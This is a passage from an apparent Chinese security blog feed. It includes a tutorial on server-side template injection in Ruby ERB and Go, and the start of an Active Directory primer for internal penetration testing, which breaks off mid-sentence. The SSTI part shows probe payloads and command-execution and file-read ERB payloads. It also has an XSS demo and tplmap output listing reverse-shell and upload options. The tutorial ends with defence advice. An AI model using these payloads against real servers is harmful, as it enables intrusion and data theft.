data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ29Mby9wLzE1NTA3NzM4Lmh0bWwjJUU2JUJDJThGJUU2JUI0JTlFJUU1JUE0JThEJUU3JThFJUIw\">Java 安全之 Thymeleaf SSTI 分析 - Zh1z3ven - 博客园 (cnblogs.com)</span></p>\n<h2 id=\"ruby\"><a class=\"markdownIt-Anchor\" href=\"#ruby\">#</a> ruby</h2>\n<h3 id=\"erb\"><a class=\"markdownIt-Anchor\" href=\"#erb\">#</a> ERB</h3>\n<p>ERB 的文档的语法如图所示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1651151342_626a91eef3e9ef68f1aa4.png!small\" alt=\"image\"></p>\n<p>对主页面下进行 <code>/?message</code>  的参数探测，发现可以输入 <code>/?message</code> <br>\n 再构造探测的 Payload，并将其转换为 url 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%= 7*7 %</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203111704891.png\" alt=\"image-20221203111704891\"></p>\n<p>回显 “49” 正是存在 SSTI 的证明，于是我们将 <code>7*7</code>  进行修改，改成任意命令注入的形式 system (“whoami”)`</p>\n<p>ERB 引擎的安全文档指出可以列出所有目录，然后按如下方式读取任意文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%= Dir.entries(&#x27;/&#x27;) %&gt;</span><br><span class=\"line\">&lt;%= File.open(&#x27;/example/arbitrary-file&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMzMTY1My5odG1s\">从 0 到 1 完全掌握 SSTI - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz\">(71 条消息) ssti 详解与例题以及绕过 payload 大全_HoAd’s blog 的博客 - CSDN 博客_ssti 绕过</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMTMwNzg3\">一文了解 SSTI 和所有常见 payload 以 flask 模板为例 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h2 id=\"go\"><a class=\"markdownIt-Anchor\" href=\"#go\">#</a> go</h2>\n<p>Go 提供了两个模板包。一个是  <code>text/template</code> ，另一个是 <code>html/template</code> 。text/template 对 XSS 或任何类型的 HTML 编码都没有保护，因此该模板并不适合构建 Web 应用程序，而 html/template 与 text/template 基本相同，但增加了 HTML 编码等安全保护，更加适用于构建 web 应用程序</p>\n<p>template 之所以称作为模板的原因就是其由静态内容和动态内容所组成，可以根据动态内容的变化而生成不同的内容信息交由客户端</p>\n<h3 id=\"texttemplate\"><a class=\"markdownIt-Anchor\" href=\"#texttemplate\">#</a> text/template</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;net/http&quot;</span><br><span class=\"line\">    &quot;text/template&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">type User struct &#123;</span><br><span class=\"line\">    ID       int</span><br><span class=\"line\">    Name  string</span><br><span class=\"line\">    Email    string</span><br><span class=\"line\">    Password string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">    user := &amp;User&#123;1,&quot;John&quot;, &quot;test@example.com&quot;, &quot;test123&quot;&#125;</span><br><span class=\"line\">    r.ParseForm()</span><br><span class=\"line\">    tpl := `&lt;h1&gt;Hi, &#123;&#123; .Name &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; .Email &#125;&#125;`</span><br><span class=\"line\">    data := map[string]string&#123;</span><br><span class=\"line\">        &quot;Name&quot;:  user.Name,</span><br><span class=\"line\">        &quot;Email&quot;: user.Email,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html := template.Must(template.New(&quot;login&quot;).Parse(tpl))</span><br><span class=\"line\">    html.Execute(w, data)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    server := http.Server&#123;</span><br><span class=\"line\">        Addr: &quot;127.0.0.1:8888&quot;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    http.HandleFunc(&quot;/string&quot;, StringTpl2Exam)</span><br><span class=\"line\">    server.ListenAndServe()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>struct 是定义了的一个结构体，在 go 中，我们是通过结构体来类比一个对象，因此他的字段就是一个对象的属性，在该实例中，我们所期待的输出内容为下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">模板内容 &lt;h1&gt;Hi, &#123;&#123; .Name &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; .Email &#125;&#125;</span><br><span class=\"line\">期待输出 &lt;h1&gt;Hi, John&lt;/h1&gt;&lt;br&gt;Your Email is test@example.com</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221204114031009.png\" alt=\"image-20221204114031009\"></p>\n<p>可以看得出来，当传入参数可控时，就会经过动态内容生成不同的内容，而我们又可以知道，go 模板是提供字符串打印功能的，我们就有机会实现 xss</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;net/http&quot;</span><br><span class=\"line\">    &quot;text/template&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">type User struct &#123;</span><br><span class=\"line\">    ID       int</span><br><span class=\"line\">    Name  string</span><br><span class=\"line\">    Email    string</span><br><span class=\"line\">    Password string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">    user := &amp;User&#123;1,&quot;John&quot;, &quot;test@example.com&quot;, &quot;test123&quot;&#125;</span><br><span class=\"line\">    r.ParseForm()</span><br><span class=\"line\">    tpl := `&lt;h1&gt;Hi, &#123;&#123;&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; .Email &#125;&#125;`</span><br><span class=\"line\">    data := map[string]string&#123;</span><br><span class=\"line\">        &quot;Name&quot;:  user.Name,</span><br><span class=\"line\">        &quot;Email&quot;: user.Email,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html := template.Must(template.New(&quot;login&quot;).Parse(tpl))</span><br><span class=\"line\">    html.Execute(w, data)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    server := http.Server&#123;</span><br><span class=\"line\">        Addr: &quot;127.0.0.1:8888&quot;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    http.HandleFunc(&quot;/string&quot;, StringTpl2Exam)</span><br><span class=\"line\">    server.ListenAndServe()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">模板内容 &lt;h1&gt;Hi, &#123;&#123;&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; .Email &#125;&#125;</span><br><span class=\"line\">期待输出 &lt;h1&gt;Hi, &#123;&#123;&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is test@example.com</span><br><span class=\"line\">实际输出 弹出/xss/</span><br></pre></td></tr></table></figure>\n<p>这里就是 text/template 和 html/template 的最大不同了</p>\n<h3 id=\"htmltemplate\"><a class=\"markdownIt-Anchor\" href=\"#htmltemplate\">#</a> html/template</h3>\n<p>同样的例子，但是我们把导入的模板包变成 html/template</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;net/http&quot;</span><br><span class=\"line\">    &quot;html/template&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">type User struct &#123;</span><br><span class=\"line\">    ID       int</span><br><span class=\"line\">    Name  string</span><br><span class=\"line\">    Email    string</span><br><span class=\"line\">    Password string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">    user := &amp;User&#123;1,&quot;John&quot;, &quot;test@example.com&quot;, &quot;test123&quot;&#125;</span><br><span class=\"line\">    r.ParseForm()</span><br><span class=\"line\">    tpl := `&lt;h1&gt;Hi, &#123;&#123;&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; .Email &#125;&#125;`</span><br><span class=\"line\">    data := map[string]string&#123;</span><br><span class=\"line\">        &quot;Name&quot;:  user.Name,</span><br><span class=\"line\">        &quot;Email&quot;: user.Email,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html := template.Must(template.New(&quot;login&quot;).Parse(tpl))</span><br><span class=\"line\">    html.Execute(w, data)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    server := http.Server&#123;</span><br><span class=\"line\">        Addr: &quot;127.0.0.1:8888&quot;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    http.HandleFunc(&quot;/string&quot;, StringTpl2Exam)</span><br><span class=\"line\">    server.ListenAndServe()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/640\" alt=\"图片\"></p>\n<p>可以看到，xss 语句已经被转义实体化了，因此对于 html/template 来说，传入的 script 和 js 都会被转义，很好地防范了 xss，但 text/template 也提供了内置函数 html 来转义特殊字符，除此之外还有 js，也存在 <code>template.HTMLEscapeString</code>  等转义函数</p>\n<h3 id=\"template常用基本语法\"><a class=\"markdownIt-Anchor\" href=\"#template常用基本语法\">#</a> template 常用基本语法</h3>\n<p>在 <code>&#123;&#123;&#125;&#125;`内的操作称之为pipeline\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;.&#125;&#125; 表示当前对象，如user对象</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;.FieldName&#125;&#125; 表示对象的某个字段</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;range …&#125;&#125;&#123;&#123;end&#125;&#125; go中for…range语法类似，循环</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;with …&#125;&#125;&#123;&#123;end&#125;&#125; 当前对象的值，上下文</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;if …&#125;&#125;&#123;&#123;else&#125;&#125;&#123;&#123;end&#125;&#125; go中的if-else语法类似，条件选择</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;xxx | xxx&#125;&#125; 左边的输出作为右边的输入</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;template &quot;navbar&quot;&#125;&#125; 引入子模版</span><br></pre></td></tr></table></figure>\n\n在go中检测 SSTI 并不像发送 &#123;&#123;7*7&#125;&#125; 并在源代码中检查 49 那么简单，我们需要浏览文档以查找仅 Go 原生模板中的行为，最常见的就是占位符</code> .`</p>\n<p>在 template 中，点 &quot;.&quot; 代表当前作用域的当前对象，它类似于 java/c++ 的 this 关键字，类似于 perl/python 的 self</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">    &quot;net/http&quot;</span><br><span class=\"line\">    &quot;text/template&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">type User struct &#123;</span><br><span class=\"line\">    ID       int</span><br><span class=\"line\">    Name  string</span><br><span class=\"line\">    Email    string</span><br><span class=\"line\">    Password string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">    user := &amp;User&#123;1,&quot;John&quot;, &quot;test@example.com&quot;, &quot;test123&quot;&#125;</span><br><span class=\"line\">    r.ParseForm()</span><br><span class=\"line\">    tpl := `&lt;h1&gt;Hi, &#123;&#123; .Name &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; . &#125;&#125;`</span><br><span class=\"line\">    data := map[string]string&#123;</span><br><span class=\"line\">        &quot;Name&quot;:  user.Name,</span><br><span class=\"line\">        &quot;Email&quot;: user.Email,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html := template.Must(template.New(&quot;login&quot;).Parse(tpl))</span><br><span class=\"line\">    html.Execute(w, data)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    server := http.Server&#123;</span><br><span class=\"line\">        Addr: &quot;127.0.0.1:8888&quot;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    http.HandleFunc(&quot;/string&quot;, StringTpl2Exam)</span><br><span class=\"line\">    server.ListenAndServe()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">模板内容 &lt;h1&gt;Hi, &#123;&#123; .Name &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your Email is &#123;&#123; . &#125;&#125;</span><br><span class=\"line\">期待输出 &lt;h1&gt;Hi, John&lt;/h1&gt;&lt;br&gt;Your Email is map[Email:test@example.com Name:John]</span><br></pre></td></tr></table></figure>\n<p>可以看到结构体内的都会被打印出来，我们也常常利用这个检测是否存在 SSTI</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTlLckNwNW4tSkljeGFLYUdYal9yUQ==\">浅学 Go 下的 ssti (qq.com)</span></p>\n<p>最后在放上我的</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uYW90dS5iYWlkdS5jb20vZmlsZS82Y2M1MDkzY2VkMzI2OTZmYmRkZTYyYzRiYmNhNGIxMg==\">新建脑图 - 百度脑图 (baidu.com)</span></p>\n<h2 id=\"tplmap\"><a class=\"markdownIt-Anchor\" href=\"#tplmap\">#</a> Tplmap</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=\">https://github.com/epinna/tplmap</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install PyYaml</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:/mnt/hgfs/共享文件夹/tplmap-master# python tplmap.py -u &quot;http://192.168.1.10:8000/?name=Sea&quot;                             //判断是否是注入点</span><br><span class=\"line\">[+] Tplmap 0.5</span><br><span class=\"line\">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Testing if GET parameter &#x27;name&#x27; is injectable</span><br><span class=\"line\">[+] Smarty plugin is testing rendering with tag &#x27;*&#x27;</span><br><span class=\"line\">[+] Smarty plugin is testing blind injection</span><br><span class=\"line\">[+] Mako plugin is testing rendering with tag &#x27;$&#123;*&#125;&#x27;</span><br><span class=\"line\">[+] Mako plugin is testing blind injection</span><br><span class=\"line\">[+] Python plugin is testing rendering with tag &#x27;str(*)&#x27;</span><br><span class=\"line\">[+] Python plugin is testing blind injection</span><br><span class=\"line\">[+] Tornado plugin is testing rendering with tag &#x27;&#123;&#123;*&#125;&#125;&#x27;</span><br><span class=\"line\">[+] Tornado plugin is testing blind injection</span><br><span class=\"line\">[+] Jinja2 plugin is testing rendering with tag &#x27;&#123;&#123;*&#125;&#125;&#x27;</span><br><span class=\"line\">[+] Jinja2 plugin has confirmed injection with tag &#x27;&#123;&#123;*&#125;&#125;&#x27;</span><br><span class=\"line\">[+] Tplmap identified the following injection point:</span><br><span class=\"line\"></span><br><span class=\"line\">  GET parameter: name                //说明可以注入，同时给出了详细信息</span><br><span class=\"line\">  Engine: Jinja2</span><br><span class=\"line\">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class=\"line\">  Context: text</span><br><span class=\"line\">  OS: posix-linux</span><br><span class=\"line\">  Technique: render</span><br><span class=\"line\">  Capabilities:</span><br><span class=\"line\"></span><br><span class=\"line\">   Shell command execution: ok           //检验出这些利用方法对于目标环境是否可用</span><br><span class=\"line\">   Bind and reverse shell: ok</span><br><span class=\"line\">   File write: ok</span><br><span class=\"line\">   File read: ok</span><br><span class=\"line\">   Code evaluation: ok, python code</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Rerun tplmap providing one of the following options:</span><br><span class=\"line\">                                                                  //可以利用下面这些参数进行进一步的操作</span><br><span class=\"line\">    --os-shell\t\t\t\tRun shell on the target</span><br><span class=\"line\">    --os-cmd\t\t\t\tExecute shell commands</span><br><span class=\"line\">    --bind-shell PORT\t\t\tConnect to a shell bind to a target port</span><br><span class=\"line\">    --reverse-shell HOST PORT\tSend a shell back to the attacker&#x27;s port</span><br><span class=\"line\">    --upload LOCAL REMOTE\tUpload files to the server</span><br><span class=\"line\">    --download REMOTE LOCAL\tDownload remote files</span><br></pre></td></tr></table></figure>\n<h2 id=\"ssti-的防护\"><a class=\"markdownIt-Anchor\" href=\"#ssti-的防护\">#</a> SSTI 的防护</h2>\n<p>(1) 和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制。<br>\n(2) 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法。</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/12/25/%E5%86%85%E7%BD%91/",
            "url": "http://example.com/2022/12/25/%E5%86%85%E7%BD%91/",
            "title": "内网渗透",
            "date_published": "2022-12-25T05:38:45.000Z",
            "content_html": "<h1 id=\"内网\"><a class=\"markdownIt-Anchor\" href=\"#内网\">#</a> 内网</h1>\n<p><strong>域基础知识，信息收集，密码抓取，内网横向，域控安全，跨域攻击</strong></p>\n<h2 id=\"域基础知识\"><a class=\"markdownIt-Anchor\" href=\"#域基础知识\">#</a> 域基础知识</h2>\n<h3 id=\"活动目录\"><a class=\"markdownIt-Anchor\" href=\"#活动目录\">#</a> 活动目录</h3>\n<p>活动目录 (Active Directory,AD) 是指域环境中提供目录服务的组件</p>\n<p>目录用于存储有关网络对象 (例如用户、组、计算机、共享资源、打印机和联系人等) 的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了 目录服务，为企业提供了网络环境的集中式管理机制</p>\n<p>活动目录的逻辑结构包括前面讲过的组织单元 (OU)、域、域树、域森林。域树内的所有域 共享一个活动目录，这个活动目录内的数据分散存储在各个域中，且每个域只存储该域内的数据。</p>\n<p>活动目录主要提供以下功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。</span><br><span class=\"line\">软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。</span><br><span class=\"line\">环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。</span><br><span class=\"line\">更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。</span><br><span class=\"line\">活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台</span><br></pre></td></tr></table></figure>\n<p>组织单元</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略</span><br></pre></td></tr></table></figure>\n<p><strong>委派控制</strong></p>\n<p>因为财务部门有 20 个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表，让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p>\n<p>grant … 权限 …</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203143640363.png\" alt=\"image-20221203143640363\"></p>\n<p>如果需要委派的人较多，那么我们可以新建组，用户加组，对该组进行委派</p>\n<h3 id=\"域内权限\"><a class=\"markdownIt-Anchor\" href=\"#域内权限\">#</a> 域内权限</h3>\n<p>组</p>\n<p>组 (Group) 是用户账号的集合。通过向组分配权限，就可以不必向每个用户分别分配权限。例如，管理员在日常工作中，不必为单个用户账号设置独特的访问权限，只需要将用户账放到相应的安全组中。管理员通过配置安全组访问权限，就可以为所有加入安全组的用户账号配置同样的权限。使用安全组而不是单个的用户账号，可以大大简化网络的维护和管理工作</p>\n<p><strong>域本地组</strong></p>\n<p>域本地组成员来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组，在本域范围内可用。</p>\n<p><strong>全局组</strong></p>\n<p>全局组成员来自于同一域的用户账户和全局组，在林范围内可用</p>\n<p><strong>通用组</strong></p>\n<p>通用组成员来自林中任何域中的用户账户、全局组和其他的通用组，在全林范围内可用</p>\n<p>域本地组来自全林，作用于本域；</p>\n<p>全局组来自本域，作用于全林；</p>\n<p>通用组来自林，作用于全林。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203150027803.png\" alt=\"image-20221203150027803\" style=\"zoom: 33%;\" />\n<p><strong>A-G-DL-P 策略</strong></p>\n<p>A-G-DL-P 策略是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>\n<p>A 表示用户账号 (Account)</p>\n<p>G 表示全局组 (Global Group)</p>\n<p>U 表示通用组 (Universal Group)</p>\n<p>DL 表示域本地组 (Domain Local Group)</p>\n<p>P 表示资源权限 (Permission, 许可)</p>\n<p>按照 AG-DL-P 策略对用户进行组织和管理是非常容易的。在 AGDL-P 策略形成以后，当需要给一个用户添加某个权限时，只要把这个用户添加到某个本地域组中就可以了。</p>\n<p>A -&gt; G -&gt;DL -&gt; P</p>\n<h3 id=\"安全域划分\"><a class=\"markdownIt-Anchor\" href=\"#安全域划分\">#</a> 安全域划分</h3>\n<p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。这个网段内的计算机拥 有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 ，从而对允许哪些 IP 